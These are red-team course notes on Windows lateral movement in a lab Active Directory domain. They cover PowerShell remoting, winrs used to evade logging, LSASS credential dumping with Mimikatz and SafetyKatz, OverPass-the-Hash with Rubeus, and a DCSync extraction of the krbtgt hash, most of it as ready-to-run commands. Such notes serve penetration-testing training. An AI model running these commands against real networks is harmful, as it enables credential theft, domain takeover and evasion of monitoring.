# PowerShell Remoting & Tradecraft

**`PSRemoting`** uses Windows Remote Management **(`WinRM`)** which is Microsoft's implementation of WS-Management.
Enabled by default on Server 2012 onwards with a firewall exception. 
Uses **`WinRM`** and listens by default on 5985 (HTTP) and 5986 (HTTPS).

- One-to-One 
- **`PSSession`**
	- Interactive
	- Runs in a new process (**`wsmprovhost`**)
	- Is Stateful 
 - Useful cmdlets
	 - `New-PSSession`
	 - `Enter-PSSession`

- One-to-Many 
- Also known as Fan-out remoting. 
- Non-interactive.
- Executes commands parallelly. 
- Useful cmdlets
	- `Invoke-Command`

```powershell
# Use below to execute commands or scriptblocks: 
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>) 

# Use below to execute scripts from files 
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Use below to execute locally loaded function on the remote machines
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)

# In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way 
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList

# Use below to execute "Stateful" commands using Invoke-Command:
$Sess = New-PSSession -Computername Server1 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

We can use **`winrs`** in place of **`PSRemoting`** to evade the logging (and still reap the benefit of 5985 allowed between hosts):

```powershell
winrs -remote:server1 -u:server1\administrator p:Pass@1234 hostname
```

We can also use winrm.vbs and COM objects of **`WSMan`** object [bohops/WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)

# Lateral Movement - Credential Extraction

**Local Security Authority (LSA)** is responsible for authentication on a Windows machine. **Local Security Authority Subsystem Service (LSASS)** is its service.
LSASS stores credentials in multiple forms - NT hash, AES, Kerberos tickets and so on.

*Credentials are stored by LSASS when a user:*
- Logs on to a local session or RDP
- Uses **`RunAs`**
- Run a Windows service
- Runs a scheduled task or batch job
- Uses a Remote Administration too

> [!resources]  Resources
> https://learn.microsoft.com/en-us/windows-server/security/windowsauthentication/credentials-processes-in-windows-authentication

*Some of the credentials that can be extracted without touching LSASS*
- SAM hive (Registry) - Local credentials
- LSA Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc.
- DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.

> [!info]
> We can use the command `Get-PSReadLineOption` which will give us `HistorySavePath`
>**************************************************************
> *How to create a PSCredential Object?*
> ```powershell
> $passwd = ConvertTo-SecureString "MySecretPassword@132" -AsPlainText -Force
> $creds = New-Object System.Management.Automation.PSCredential ("dcorp\administrator",$passwd)
> Enter-PSSession -Credential $creds -ComputerName dcorp-dc
> ```

> [!resources]
> [Fantastic Windows Logon types and Where to Find Credentials in Them - AltSec](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)
> ****
> [Credential Access & Dumping | Red Team Notes](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)

# Lateral Movement - Mimikatz

**`Mimikatz`** can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting attacks!

```powershell
# Dump credentials using Mimikatz
mimikatz.exe -Command '"sekurlsa::ekeys"'

# Using SafetyKatz (Minidump of LSASS and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"
```

> [!resources]
> [Unofficial Guide to Mimikatz & Command Reference – Active Directory & Azure AD/Entra ID Security](https://adsecurity.org/?p=2207)
> ****
> [gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)
> ****
> [GhostPack/SafetyKatz: SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader](https://github.com/GhostPack/SafetyKatz)
> ****
> [fortra/impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/fortra/impacket)

# Lateral Movement - OverPass-The-Hash

**What's the difference between: Pass-the-Hash and OverPass-the-Hash?**
*Pass-the-Hash:* We replay NTLM hashes of a Local User
*OverPass-the-Hash:* In case of OverPass-the-Hash, you are using Domain User's credentials. You generate Kerberos Tokens using NTLM hashes or RC4 and AES keys.

```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256: /run:cmd.exe" "exit"

# The above commands starts a process with a logon type 9 (same as runas /netonly)
```

**Over Pass the hash (OPTH)** generate tokens from hashes or keys.

```powershell
# Below doesn't need elevation
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash>

# Below command needs elevation
Rubues.exe asktgt /user:administrator /aes256:<aes256key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

> [!note]
> OPTH is only for Kerberos

# Lateral Movement - DCSync

To extract credentials from the DC without code execution on it, we can use DCSync.
To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain:

```powershell
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

> [!note]
>By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync. 

